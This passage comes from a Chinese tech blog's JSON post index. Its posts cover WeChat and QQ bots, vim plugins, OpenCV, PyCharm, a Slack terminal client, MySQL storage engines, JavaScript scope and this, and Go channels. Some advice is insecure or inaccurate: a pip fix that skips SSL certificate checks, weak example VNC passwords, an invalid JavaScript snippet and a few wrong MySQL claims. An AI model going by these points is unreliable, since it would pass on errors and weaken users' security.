itchat.auto_login(hotReload=True)\n    send_group(u\"你的群聊名字\", \"test msg\")\n    itchat.run()\n\n```\n\n\n\n\n\n### 3. 机器人AI聊天\n\n```python\n# coding=utf8\nimport itchat\nimport requests\n\nKEY = 'xxxxxxxx' #可以去http://www.turingapi.com/申请\n\n\ndef get_response(msg):\n    apiUrl = 'http://www.tuling123.com/openapi/api'\n    data = {\n        'key': KEY,\n        'info': msg,\n        'userid': 'wechat-robot',\n    }\n    try:\n        r = requests.post(apiUrl, data=data).json()\n        return r.get('text')\n    except:\n        return\n\n\n@itchat.msg_register(itchat.content.TEXT)\ndef tuling_reply(msg):\n    defaultReply = 'I received: ' + msg['Text']\n    reply = get_response(msg['Text'])\n    return reply or defaultReply\n\n\nitchat.auto_login(hotReload=True)\nitchat.run()\n```\n\n\n\n### 4. 消息防撤回\n\n可参考下面的这个项目\n\nhttps://github.com/ccding/wechat-anti-revoke \n\n\n\n### 5. 其他微信机器人项目\n\n+ https://github.com/youfou/wxpy   在 itchat 的基础上，通过大量接口优化提升了模块的易用性，并进行丰富的功能扩展\n+ https://github.com/lb2281075105/Python-WeChat-ItChat 使用itchat的一些demo\n+ https://github.com/littlecodersh/itchatmp 微信公众号、企业号接口项目\n+ https://github.com/newflydd/itchat4go golang版本封装的itchat\n\n\n\n","tags":["wechat"],"categories":["爬虫"]},{"title":"qq机器人酷q的使用","url":"%2Fp%2F545a4e78.html","content":"\n\n\n近期准备用qq机器人实现往qq群里发消息. 需要用到qq机器人.\n\n据说在2019年前, 用qq机器人是非常之方便. 但是自从Smart QQ 协议在 2019 年 1 月 1 日停止服务后, 网上好多qq机器人项目都失效了.\n\n目前找到了一款酷Q机器人 https://cqp.cc/, 使用并且测试成功.  最重要的一点是酷Q的Air版还是免费的.\n\n\n\n<!-- more -->\n\n### 1. 下载使用\n\n酷Q官方下载的是windows版本(https://cqp.cc/t/23253) , 需要在windows上运行并登录QQ. 这个虽然简单方便, 但是需要一直在windows上挂着, 很显然这个条件不太具备.\n\n目的是在linux上挂机运行酷Q, 所以找到了酷Q的`docker`版本.\n\n\n\n### 2. 安装酷Q docker版本\n\n+ 安装docker(已安装docker直接看下一步)\n\n```shell\nyum install yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\nyum install docker-ce\n\n\nsystemctl start docker\nsystemctl enable docker\n```\n\n\n\n+ 安装酷Q官方 docker 版本  https://cqp.cc/t/34558 (建议安装下面的CoolQ插件版本)\n\n```shell\ndocker pull coolq/wine-coolq\nmkdir /root/coolq-data # 用于存储酷 Q 的程序文件\n\ndocker run --name=coolq --d \\\n-p 9001:9000 \\ # noVNC 端口，用于从浏览器控制酷 Q\n-v /root/coolq-data:/home/user/coolq \\ # 将宿主目录挂载到容器内用于持久化酷 Q 的程序文件\n-e VNC_PASSWD=12345678 \\ # 设置noVNC登录密码, 默认密码是 MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # 要登录的 QQ 账号，可选\ncoolq/wine-coolq\n```\n\n此时在浏览器中访问 http://你的服务器IP:你的端口 即可看到远程操作登录页面，输入密码，即可看到 酷Q Air 的登录界面啦。\n\n\n\n+ 安装CoolQ插件的 docker 版本 https://github.com/richardchien/coolq-http-api\n\nCoolQ插件通过 HTTP 或 WebSocket 对酷 Q 的事件进行上报以及接收请求来调用酷 Q 的 DLL 接口，从而可以使用其它语言编写酷 Q 插件。\n\n  \n\n```shell\ndocker pull richardchien/cqhttp:latest\nmkdir coolq  # 用于存储酷 Q 的程序文件\n\ndocker run -ti -d --name cqhttp-test \\\n-v $(pwd)/coolq:/home/user/coolq \\  # 将宿主目录挂载到容器内用于持久化酷 Q 的程序文件\n-p 9001:9000 \\ # noVNC 端口，用于从浏览器控制酷 Q\n-p 5700:5700 \\ # HTTP API 插件开放的端口\n-e VNC_PASSWD=12345678 \\ # 设置noVNC登录密码, 默认密码是 MAX8char\n-e COOLQ_ACCOUNT=123456 \\ # 要登录的 QQ 账号，可选\n-e CQHTTP_SERVE_DATA_FILES=yes \\ # 允许通过 HTTP 接口访问酷 Q 数据文件\nrichardchien/cqhttp:latest\n```\n\n\n\n### 3. 发送消息到qq群\n\n其实QQ机器人不仅能发送消息到qq群, 还能发送消息到个人, 转发群消息, 加好友, 踢人等一系列操作\n\n详见api列表:  https://richardchien.gitee.io/coolq-http-api/docs/4.8/#/API\n\n\n\n+ 调用方式也很简单, 参见api文档\n\n```\nPOST  http://ip:5700/send_group_msg\n\ngroup_id: qq群号\nmessage: 发送的消息\n```\n\n\n\n### 4. 酷Q机器人AI聊天\n\n机器人还有个用处就是可以实现AI自动聊天.\n\n目前酷Q支持 图灵机器人(http://www.turingapi.com/)和小i机器人(http://cloud.xiaoi.com/)\n\n安装酷Q后,添加对应的程序即可","tags":["robot"],"categories":["爬虫"]},{"title":"vim实用插件的使用","url":"%2Fp%2F999f6ee6.html","content":"\n工欲善其事必先利其器,  记录一些 vim 常用的插件。\n\n# 1. 插件管理vim-plug\n\n项目地址: https://github.com/junegunn/vim-plug\n\n<!-- more -->\n\n### 1.1 安装\n\n``` bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### 1.2 使用\n\n```yml\ncall plug#begin('~/.vim/plugged')\nPlug 'tpope/vim-sensible'\nPlug 'junegunn/seoul256.vim'\ncall plug#end()\n```\n\n+ 安装插件: PlugInstall\n+ 卸载插件: PlugClean\n\n\n\n# 2. 主题gruvbox\n\n项目地址: https://github.com/morhetz/gruvbox\n\n### 2.1 安装\n\n```yml\nPlug 'morhetz/gruvbox'\n```\n\n\n\n# 3. 状态栏airline\n\n项目地址: https://github.com/vim-airline/vim-airline\n\n### 3.1 安装\n\n```yml\nPlug 'vim-airline/vim-airline'\nPlug 'vim-airline/vim-airline-themes'\nlet g:airline#extensions#tabline#enabled = 1\nlet g:airline_theme='simple' \" https://github.com/vim-airline/vim-airline/wiki/Screenshots\n```\n\n\n\n# 4. 模糊搜索fzf \n\n### 4.1 安装\n\n```yml\nPlug 'junegunn/fzf', { 'do': { -> fzf#install() } } \"极限搜索文件\nPlug 'junegunn/fzf.vim'\n```\n\n\n\n# 5. 极限跳转easymotion\n\n### 5.1 安装\n\n```yml\nPlug 'easymotion/vim-easymotion' \"极速搜索跳转\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>l <Plug>(easymotion-lineforward)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>h <Plug>(easymotion-linebackward)\n```\n\n\n\n# 10. 参考资料\n\n+ https://github.com/topics/vim\n\n","tags":["vim"],"categories":["vim"]},{"title":"opencv在python下的安装和使用","url":"%2Fp%2F415d206d.html","content":"\n\n\n### 安装opencv\n\n\n```shell\npip3 install numpy\npip3 install opencv-python\n```\n\n在安装`opencv-python`出现了以下错误信息:\n\n```\n Could not fetch URL https://pypi.org/simple/opencv-python/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/opencv-python/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:726)'),)) - skipping\n```\n\n解决方案: \n\n```shell\npip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org opencv-python\n```\n\n\n\n<!-- more -->\n\n### opencv rotate code\n\n```python\nimport sys\nimport cv2\nimport numpy as np\n\n\nif len(sys.argv) != 2 :\n    print(\"usage: ./images path\")\n    sys.exit(1)\n\nimg = cv2.imread(sys.argv[1])\ncv2.imshow(\"Source\", img)\n\nimg90 = np.rot90(img) # 旋转90\ncv2.imshow(\"Rotate\", img90)\n\ncv2.waitKey(0)\ncv2.destroyAllWindows()\n```\n","tags":["python"],"categories":["python"]},{"title":"opencv在mac源码安装并运行cpp版","url":"%2Fp%2F9c99a6b7.html","content":"\n\n\n### 1. mac 安装 cmake\n\n+ 下载安装 CMake。\n\n  https://cmake.org/download/   Mac OS X 10.7 or later\n\n+ 安装完成之后，使用以下指令创建/usr/local/bin下 CMake 的软链接。\n\n```shell\nsudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install\n```\n\n\n\n### 2. 源码安装 opencv\n\n目前opencv已经出到4.0+版本了, 网上大部分教程都是2.0,3.0版本的.\n\n不过我们选择最新的版本, 直接从github上拉取\n\n```shell\ngit clone https://github.com/opencv/opencv.git\nmkdir build\ncd build\ncmake ..\nmake \nsudo make install\n```\n\n<!-- more -->\n\n### 3. xcode 配置opencv\n\n如果不想用xcode来开发, 编译的时候直接指定下面的选项\n\n+ Header Search Paths\n\n```\n/usr/local/include/opencv4  (不一定是这个, 要看你的make install 安装到哪个目录了)\n```\n\n+ Library Search Paths\n\n```\n/usr/local/lib (不一定是这个, 要看你的make install 安装到哪个目录了)\n```\n\n+ Other Linker Flags\n\n```\n-lopencv_calib3d -lopencv_core -lopencv_dnn -lopencv_features2d -lopencv_flann -lopencv_gapi -lopencv_highgui -lopencv_imgcodecs -lopencv_imgproc -lopencv_ml -lopencv_objdetect -lopencv_photo -lopencv_stitching -lopencv_video -lopencv_videoio \n```\n\n不一定是这些, 要去`/usr/local/lib` 文件夹(`make install`安装目录)下看 opencv开头的库\n\n\n\n\n### 4. opencv rotate code\n\n```cpp\n#include <stdio.h>\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\nint main(int argc, char* argv[])\n{\n    if (argc != 3)\n    {\n        printf(\"usage: ./images path angle\\n\");\n        return -1;\n    }\n    \n    Mat source = imread(argv[1], 1);\n    if (!source.data)\n    {\n        printf(\"No image data \\n\");\n        return -1;\n    }\n    \n    double angle = atof(argv[2]);\n    Point2f src_center(source.cols/2.0F, source.rows/2.0F);\n    Mat rot_mat = getRotationMatrix2D(src_center, angle, 1.0);\n    Mat dst;\n    warpAffine(source, dst, rot_mat, source.size());\n    \n\n    imshow(\"Source\", source);\n    imshow(\"Rotate\", dst);\n    waitKey(0);\n    \n    return 0;\n}\n```\n\n","tags":["opencv"],"categories":["c++"]},{"title":"python最好用IDE之pycharm的使用","url":"%2Fp%2Fb3d62374.html","content":"\n\n\n工欲善其事必先利其器, 学习 python 自然选用了 jetbrains 家族的 Pycharm.\n\n### 1. pycharm formatting on save\n\n1. PyCharm -> Preferences -> Plugins -> Save Actions -> install and restart ide\n2. PyCharm -> Preferences -> Save Actions -> Reformat file\n\n![1](python最好用IDE之pycharm的使用/1.png)\n\n<!-- more -->\n\n3. 取消Power Save Mode\n\n   IDE右下角有个机器人, 一定不要勾选 Power Save Mode\n\n   具体表现：关闭后，Pycharm就跟文本编辑器差不多了，不会去关联上下文，像纠错、联想关键字等功能都没有了\n\n\n\n### 2. Keymap\n\n进入发现了, ctrl+w 和 ctrl+a 和 ctrl+e 失效, 很别扭, 研究发现了, 需要在 Keymap 选择  `Mac OS X 10.5+`\n\nctrl + w 关闭\n\nctrl + a 到行首\n\nctrl + e 到行尾\n\n\n\n### 3. Alt + Enter 万能组合键\n\nimport 包经常要用到这个组合键, 但是发现在我的电脑上又失效\n\n网上找了很多方法也没有解决. 一说是其他程序占用, 可以关闭所有程序试试\n\n最后找到了解决方案, 就是把`Save Actions`  插件停掉, 重启之后再开启, 就好了(吐血)\n\n\n\n### 4. module unresolved reference\n\n- 在项目的文件夹(module 的上一级)右键 `Mark Directory as` -> `Source root`\n- `File` -> `Invalidate Caches / Restart` and restart PyCharm.","tags":["python"],"categories":["python"]},{"title":"slack的终端client","url":"%2Fp%2Fb47a642f.html","content":"\n# 1. slack terminal client\n\n让 slack 运行在终端里, 可以更快的看到消息并回复\n\n![Screenshot](slack%E7%9A%84%E7%BB%88%E7%AB%AFclient/screenshot.png)\n\n<!-- more -->\n\n# 2. 安装和使用\n\n### 2.1 安装\n\n下载最新的release:  https://github.com/erroneousboat/slack-term/releases\n\n```bash\nmv slack-term-darwin-amd64 /usr/local/bin/slack-term\n\nslack-term --config ~/.config/slack-term/config # slack-term并没有生成默认配置, 所以需要带--config指定文件\n```\n\n\n\n### 2.2 配置\n\n`vi ~/.config/slack-term/config`\n\n```ini\n{\n\t\"slack_token\": \"xoxp-\",\n\t\"emoji\": true\n}\n```\n\n获取token地址:  https://github.com/erroneousboat/slack-term/wiki#running-slack-term-without-legacy-tokens\n\n最后创建一个别名:\n\n```bash\nalias slack=\"slack-term --config ~/.config/slack-term/config\"\n```\n\n\n\n# 3. 参考资料\n\n+ https://github.com/erroneousboat/slack-term","tags":["slack"],"categories":["软件"]},{"title":"mysql中myisam和innodb区别","url":"%2Fp%2Ff9fde0e9.html","content":"\n\n\n# 1. MySQL存储引擎\n\n### 1.1 默认存储引擎的变迁\n\n在MySQL 5.1之前的版本中，默认的搜索引擎是MyISAM，从MySQL 5.5之后的版本中，默认的搜索引擎变更为InnoDB。\n\nInnoDB 支持事务，MyISAM 不支持事务。这是 MySQL 将默认存储引擎从 MyISAM 变成 InnoDB 的重要原因之一。\n\nInnoDB 最小的锁粒度是行锁，MyISAM 最小的锁粒度是表锁。一个更新语句会锁住整张表，导致其他查询和更新都会被阻塞，因此并发访问受限。这也是 MySQL 将默认存储引擎从 MyISAM 变成 InnoDB 的重要原因之一。\n\n<!-- more -->\n\n### 1.2 MyISAM\n\nMyISAM存储引擎的特点是：表级锁、**不支持事务**和 全文索引，适合一些CMS内容管理系统作为后台数据库使用，但是使用大并发、重负荷生产系统上，表锁结构的特性就显得力不从心；\n\nMyISAM适合：\n\n（1）做很多count 的计算；\n\n（2）插入不频繁，查询非常频繁，如果执行大量的SELECT，MyISAM是更好的选择；\n\n（3）没有事务。\n\n### 1.3 InnoDB\n\nInnoDB存储引擎的特点是：行级锁、事务安全（ACID兼容）、支持外键、不支持FULLTEXT类型的索引(5.6.4以后版本开始支持FULLTEXT类型的索引)。\n\nInnoDB存储引擎提供了具有提交、回滚和崩溃恢复能力的事务安全存储引擎。InnoDB是为处理巨大量时拥有最大性能而设计的。它的CPU效率可能是任何其他基于磁盘的关系数据库引擎所不能匹敌的。\n\nInnoDB适合：\n\n（1）可靠性要求比较高，或者要求事务；\n\n（2）表更新和查询都相当的频繁，并且表锁定的机会比较大的情况指定数据引擎的创建；\n\n（3）如果你的数据执行大量的INSERT或UPDATE，出于性能方面的考虑，应该使用InnoDB表；\n\n（4）DELETE FROM table时，InnoDB不会重新建立表，而是一行一行的 删除；\n\n（5）LOAD TABLE FROM MASTER操作对InnoDB是不起作用的，解决方法是首先把InnoDB表改成MyISAM表，导入数据后再改成InnoDB表，但是对于使用的额外的InnoDB特性（例如外键）的表不适用。\n\n\n\n要注意，创建每个表格的代码是相同的，除了最后的 TYPE参数，这一参数用来指定数据引擎。\n\n\n\n# 2. 具体区别\n\n+ 存储结构\n\nMyISAM：每个MyISAM在磁盘上存储成三个文件。分别为：表定义文件、数据文件、索引文件。第一个文件的名字以表的名字开始，扩展名指出文件类型。.frm文件存储表定义。数据文件的扩展名为.MYD (MYData)。索引文件的扩展名是.MYI (MYIndex)。\n\nInnoDB：所有的表都保存在同一个数据文件中（也可能是多个文件，或者是独立的表空间文件），InnoDB表的大小只受限于操作系统文件的大小，一般为2GB。\n\n\n\n+ 索引\n\nMyISAM: 是非聚集索引，数据文件是分离的，索引保存的是数据文件的指针。主键索引和辅助索引是独立的。\n\nInnoDB: 是聚集索引。聚簇索引的文件存放在主键索引的叶子节点上，因此 InnoDB 必须要有主键，通过主键索引效率很高。但是辅助索引需要两次查询，先查询到主键，然后再通过主键查询到数据。因此，主键不应该过大，因为主键太大，其他索引也都会很大。\n\n\n\n+ 存储空间\n\nMyISAM： MyISAM支持支持三种不同的存储格式：静态表(默认，但是注意数据末尾不能有空格，会被去掉)、动态表、压缩表。当表在创建之后并导入数据之后，不会再进行修改操作，可以使用压缩表，极大的减少磁盘的空间占用。\n\nInnoDB： 需要更多的内存和存储，它会在主内存中建立其专用的缓冲池用于高速缓冲数据和索引。\n\n\n\n+ 可移植性、备份及恢复\n\nMyISAM：数据是以文件的形式存储，所以在跨平台的数据转移中会很方便。在备份和恢复时可单独针对某个表进行操作。\n\nInnoDB：免费的方案可以是拷贝数据文件、备份 binlog，或者用 mysqldump，在数据量达到几十G的时候就相对痛苦了。\n\n\n\n+ 事务支持\n\nMyISAM：强调的是性能，每次查询具有原子性,其执行数度比InnoDB类型更快，但是不提供事务支持。\n\nInnoDB：提供事务支持事务，外部键等高级数据库功能。 具有事务(commit)、回滚(rollback)和崩溃修复能力(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表。\n\n\n\n+ AUTO_INCREMENT \n\nMyISAM：可以和其他字段一起建立联合索引。引擎的自动增长列必须是索引，如果是组合索引，自动增长可以不是第一列，他可以根据前面几列进行排序后递增。\n\nInnoDB：InnoDB中必须包含只有该字段的索引。引擎的自动增长列必须是索引，如果是组合索引也必须是组合索引的第一列。\n\n\n\n+ 表锁差异\n\nMyISAM： 只支持表级锁，用户在操作myisam表时，select，update，delete，insert语句都会给表自动加锁，如果加锁以后的表满足insert并发的情况下，可以在表的尾部插入新的数据。\n\nInnoDB： 支持事务和行级锁，是innodb的最大特色。行锁大幅度提高了多用户并发操作的新能。但是InnoDB的行锁，只是在WHERE的主键是有效的，非主键的WHERE都会锁全表的。\n\n\n\n+ 全文索引\n\nMyISAM：支持 FULLTEXT类型的全文索引\n\nInnoDB：不支持FULLTEXT类型的全文索引，但是innodb可以使用sphinx插件支持全文索引，并且效果更好。\n\n\n\n+ 表主键\n\nMyISAM：允许没有任何索引和主键的表存在，索引都是保存行的地址。\n\nInnoDB：如果没有设定主键或者非空唯一索引，就会自动生成一个6字节的主键(用户不可见)，数据是主索引的一部分，附加索引保存的是主索引的值。\n\n\n\n+ 表的具体行数\n\nMyISAM： 保存有表的总行数，如果select count(*) from table;会直接取出出该值。*\n\nInnoDB： 没有保存表的总行数，如果使用select count(*) from table；就会遍历整个表，消耗相当大，但是在加了wehre条件后，myisam和innodb处理的方式都一样。\n\n\n\n+ CRUD操作\n\nMyISAM：如果执行大量的SELECT，MyISAM是更好的选择。\n\nInnoDB：如果你的数据执行大量的INSERT或UPDATE，出于性能方面的考虑，应该使用InnoDB表。\n\n\n\n+ 外键\n\nMyISAM：不支持\n\nInnoDB：支持\n\n\n\n# 3. 参考资料\n\n+ [MySQL存储引擎－－MyISAM与InnoDB区别](https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000008227211)\n\n","tags":["mysql"],"categories":["mysql"]},{"title":"javascript作用域,上下文环境,自由变量以及闭包","url":"%2Fp%2F1e35a583.html","content":"\n\n\n### javascript 的作用域\n\n+ 在 javascript 中, 没有块级的作用域 (反人类),  所以为了避免误解, 最好不要在块作用域内声明变量\n\n```javascript\nvar i = 10;\nif i > 1 {\n    var name = \"levon\";\n}\nconsole.log(name);//levon\n```\n\n+ 除了全局作用域, 只有函数才可以创建作用域\n+ 作用域有上下级关系, 最大的目的就是隔离变量, 不同作用域下同名变量也不会冲突\n\n```javascript\nvar a = 10; //window.a = 10; 全局作用域\n\nfunction fn(){\n    var a = 100; //fn 作用域\n    \n    function bar(){\n        var a = 1000; //bar 作用域\n    }\n}\n```\n\n<!-- more -->\n\n### javascript 的作用域和执行上下文环境\n\n- 作用域只是一个“地盘”，一个抽象的概念。\n- 如果要查找一个作用域下某个变量的值，就需要找到这个作用域对应的执行上下文环境，再在其中寻找变量的值。\n- 作用域中变量的值是在执行过程中产生的确定的，而作用域却是在函数创建时就确定了。\n- 同一个作用域下，不同的调用会产生不同的执行上下文环境，继而产生不同的变量的值。\n\n\n\n### 作用域和上下文环境绝对不是一回事儿\n\n+ 作用域:\n\n首先，它很抽象。另外除了全局作用域，只有函数才能创建作用域。创建一个函数就创建了一个作用域，无论你调用不调用，函数只要创建了，它就有独立的作用域，就有自己的一个“地盘”。\n\n+ 上下文环境:\n\n可以理解为一个看不见摸不着的对象（有若干个属性），虽然看不见摸不着，但确实实实在在存在的，因为所有的变量都在里面存储着，要不然咱们定义的变量在哪里存？\n\n另外，对于函数来说，上下文环境是在调用时创建的，这个很好理解。拿参数做例子，你不调用函数，我哪儿知道你要给我传什么参数？\n\n+ 两者之间的关系:\n\n一个作用域下可能包含若干个上下文环境。有可能从来没有过上下文环境（函数从来就没有被调用过）；有可能有过，现在函数被调用完毕后，上下文环境被销毁了；有可能同时存在一个或多个（闭包）。\n\n```javascript\nvar x = 100;\nfunction fn(x){\n    return function(){\n        console.log(x);\n    }\n}\n\nvar f1 = fn(5);\nvar f2 = fn(10);\n\nf1();//5\nf2();//10\n```\n\n上面代码一个fn作用域下同时存在两个上下文环境。可以理解作用域是静态的组织结构，而上下文环境是动态的调用。\n\n\n\n### 自由变量依赖静态作用域\n\n- 在 A作用域中使用的变量 x, 却没有在 A作用域中声明(即在其他作用域中声明的), 那么对于 A作用域来说, x 就是一个自由变量.\n\n```javascript\nvar x = 10;\nfunction fn(){\n    var b = 20;\n    console.log(x + b); //这里的 x 就是一个自由变量\n}\n```\n\n- 那么去哪里取自由变量的值?  要到 创建 包含自由变量 函数 的那个 作用域 中取值——是“创建”，而不是“调用”. 一定要切记其实这就是所谓的“静态作用域”。\n\n- 那么在执行 fn 的时候, x 取值去哪里取呢?  答案是要到创建fn函数的那个作用域中取——>无论fn函数将在哪里调用。(anywhere call, only find on create)\n\n- 如果静态作用域找不到怎么办? 此时就需要一级一级跨作用域一直找到全局作用域\n\n```javascript\nvar a = 10;\n\nfunction fn(){\n    var b = 20; // 如果此处没有20, b 就会找到200\n    \n    function bar(){\n        console.log(a + b);// a 一直跨到全局作用域找到, b 直接在 fn 作用域找到,  \n    }\n    \n    return bar;\n}\n\nvar x = fn();\nvar b = 200;\nx();\n```\n\n\n\n来看一道题:\n\n```javascript\nvar x = 10;\n\nfunction show(){\n\n\tfunction fn(){\n\t\tconsole.log(x);\n\t}\n\n    var x = 20;\n\n\t(function(){\n\t\tvar x = 30;\n\t\tfn();\n\t})();\n}\n\nshow();//答案是20, 想想为什么\n```\n\n\n\n### 闭包其实就是上下文环境不销毁\n\n闭包一般只有两种情况——函数作为返回值，函数作为参数传递。\n\n```javascript\nfunction fn(){\n    var max = 10;\n    \n    return function bar(x){\n        if (x > max){\n            console.log(x);\n        }\n    };\n}\n\nvar f1 = fn();\nvar max = 100;\nf1(15);\n```\n\n\n\n+ 全局上下文环境准备,   global —>  f1 = undefined, max = undefined\n+ 执行到 var f1 = fn();  进入fn()执行上下文环境.    fn —> max = 10\n+ fn() 函数返回, 本来要销毁上下文的max,  但是 bar 函数却引用了这个max, 因此这个max不能被销毁，销毁了bar函数中的max就找不到值了。所以fn()上下文环境保留.  fn —> max = 10\n+ var max = 100;    global —> f1 = fn(), max = 100\n+ f1(15)  进入fn执行上下文环境, max 是10,  x 是15, 输出15\n+ 执行完毕进入全局上下文环境\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascript执行上下文的准备工作","url":"%2Fp%2Fcfbcfff.html","content":"\n\n\n### 全局上下文的准备工作:\n\n全局环境下 javascript真正运行语句之前, 解释器会做一些准备工作:\n\n- 对变量的声明 (而变量的赋值, 是真正运行到那一行的时候才进行的.)\n- 对全局变量 this 的赋值\n- 对函数声明赋值, 对函数表达式声明\n\n\n\n如何理解这三种情况呢?\n\n1. 对变量的声明:\n\n```javascript\nconsole.log(a); // undefined\nvar a = 10;\n```\n\n准备工作是提前声明了变量 a, 和下面写法意思一样\n\n```javascript\nvar a; \nconsole.log(a); // undefined\na = 10;\n```\n\n<!-- more -->\n\n2. 对全局变量 this 的赋值:\n\n```javascript\nconsole.log(this) // window\n```\n\n执行前的准备工作是:  this 赋值为全局的 window 对象\n\n\n\n3. 对函数声明赋值, 对函数表达式声明:\n\n```javascript\nconsole.log(f1);// function f1() {}\nfunction f1() {} //这个是函数声明\n\nconsole.log(f2);  // undefined\nvar f2 = function(){}; //这个是函数表达式\n```\n\n执行前的准备工作是:  函数声明 f1 被赋值, 函数表达式 f2 被声明\n\n\n\n### 函数上下文额外的准备工作:\n\n1. 函数定义时, 额外的准备工作:\n\n- 记录函数内自由变量的作用域.  (自由变量就是引用外部作用域的变量)\n\n```javascript\nvar a = 10;\nfunction fn (){\n    console.log(a); // a是自由变量,此处定义时就记录了a要取值的作用域,即全局作用域\n}\n\nfunction bar(f){\n    var a = 20;\n    f(); // 输出10, 而不是20, 因为fn函数内自由变量 a 的作用域早被记录下来了,是外面的10\n}\nbar(fn)\n```\n\n\n\n2. 函数调用时, 额外的准备工作:\n\n- arguments 变量的赋值\n- 函数参数的赋值\n\n```javascript\nfunction fn(x){\n    console.log(arguments); // [10]\n    console.log(x); // 10\n}\nfn(10);\n```\n\n\n\n### 来看一道题:\n\n```javascript\nvar a = 'global';\nvar f = function(){\n    console.log(a); // 答案是undefined, 想想为什么\n    var a = 'local';\n}\nf();\n```\n\n","tags":["javascript"],"categories":["javascript"]},{"title":"javascript的this究竟指什么","url":"%2Fp%2Fd14f4ebd.html","content":"\n\n\n在学习 javascript 的 this之前, 我们需要先明确一个重要知识:\n\n> 在函数中this到底取何值，是在函数真正被调用执行的时候确定的，函数定义的时候确定不了。\n>\n> 简单记忆是，谁调用的函数，this就指向谁.\n\n\n\n在 javascript 中, this的取值，一般分为下面几种情况。\n\n### 一.  构造函数\n\n+ new 出的对象:\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // 当前构造的对象\n}\n\nvar f1 = new Foo();\n```\n\n\n\n+ 直接运行函数(普通函数使用):\n\n```javascript\nfunction Foo(){\n  this.name = \"levon\";\n  this.age = 26;\n  console.log(this); // 直接调用注意此处是 window\n}\n\nFoo();// window.Foo();\n```\n\n<!-- more -->\n\n### 二.  函数作为对象的属性\n\n+ 对象调用本身的函数:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // 此处就是 obj\n        console.log(this.x);//10\n    }\n}\n\nobj.fn();\n```\n\n\n\n+ 如果不用对象去调用:\n\n```javascript\nvar obj = {\n    x : 10,\n    fn : function(){\n        console.log(this);  // window\n        console.log(this.x);// undefined\n    }\n}\n\nvar fn1 = obj.fn;\nfn1();//window.fn1();\n\n```\n\n\n\n+ 需要注意的一种情况是下面的 f()函数, 此时 f()只是一个普通函数\n\n```javascript\nvar obj = {\n\tx : 10,\n\tfn : function(){\n\t\t\n        this;// 此处是 obj\n        \n\t\tfunction f(){\n\t\t\tconsole.log(this); // window\n\t\t\tconsole.log(this.x);// undefined\n\t\t}\n\t\tf();\n        \n\t}\n}\n\nobj.fn();\n```\n\n  \n\n### 三: 函数用 call 或 apply 调用\n\n+ 函数调用 call\n\n```javascript\nvar obj = {\n    x : 10\n};\n\nvar fn = function(){\n    console.log(this);  //函数调用call, this指向call中的参数, 就是obj\n    console.log(this.x);// 10\n}\n\nfn.call(obj)\n```\n\n\n\n### 四:  全局环境下的 this\n\n```javascript\nconsole.log(this); // window\n\n\nvar x = 10; //--> window.x = 10\nvar fn = function(){\n    console.log(this); //window\n    console.log(this.x)//10\n}\nfn();// window.fn();\n```\n\n\n\n### 五: 原型链中的 this\n\n```javascript\nfunction Fn(){\n    this.name = \"levon\";\n}\n\nFn.prototype.getName = function(){\n    console.log(this.name); //此处 this 是调用的当前对象 f1\n}\n\nvar f1 = new Fn();\nf1.getName(); //levon\n```\n\n\n\n其实不仅仅是构造函数的prototype，即便是在整个原型链中，this代表的也都是当前对象的值。","tags":["javascript"],"categories":["javascript"]},{"title":"golang面试基础知识点","url":"%2Fp%2F19ae52d4.html","content":"\n\n\n# 1. channel\n\n### 1.1 关闭有缓冲数据的 channel， 还能读取吗（可以）\n\n只有当channel无数据，且channel被close了，才会返回ok=false。 只要有堆积数据，即使 close() 也不会返回关闭状态。\n\n关闭后有数据也能从里面得到数据，除非消耗空了。\n\n<!-- more -->\n\n```go\nfunc main() {\n\n\tc := make(chan int, 10)\n\tc <- 1\n\tc <- 2\n\tc <- 3\n\tclose(c)\n\n\tfor {\n\t\tdata, ok := <-c\n\t\tif !ok {\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(data, ok)\n\t}\n}\n\n/*\n1 true\n2 true\n3 true\n*/\n```\n\n\n\n### 1.2 channel 被close后，还能被接收或 select 吗（可以读，不能写）\n\n+ 如果有缓存，值能被收到，ok 是 true\n\n+ 如果无缓存，值是0，ok 是 false，但不会 panic\n+ 关闭后, 就是你可以读, 但是不能写。\n\n\n\n### 1.3 如何判断channel已经关闭了 ？\n\n**Go 中没有一个內建函数去检测管道是否已经被关闭。**\n\n+ 直接读取channel结构hchan的closed字段, 不安全\n\n```go\nimport (\n    \"unsafe\"\n    \"reflect\"\n)\n\n\nfunc isChanClosed(ch interface{}) bool {\n    if reflect.TypeOf(ch).Kind() != reflect.Chan {\n        panic(\"only channels!\")\n    }\n\n    // get interface value pointer, from cgo_export \n    // typedef struct { void *t; void *v; } GoInterface;\n    // then get channel real pointer\n    cptr := *(*uintptr)(unsafe.Pointer(\n        unsafe.Pointer(uintptr(unsafe.Pointer(&ch)) + unsafe.Sizeof(uint(0))),\n    ))\n\n    // this function will return true if chan.closed > 0\n    // see hchan on https://github.com/golang/go/blob/master/src/runtime/chan.go \n    // type hchan struct {\n    // qcount   uint           // total data in the queue\n    // dataqsiz uint           // size of the circular queue\n    // buf      unsafe.Pointer // points to an array of dataqsiz elements\n    // elemsize uint16\n    // closed   uint32\n    // **\n\n    cptr += unsafe.Sizeof(uint(0))*2\n    cptr += 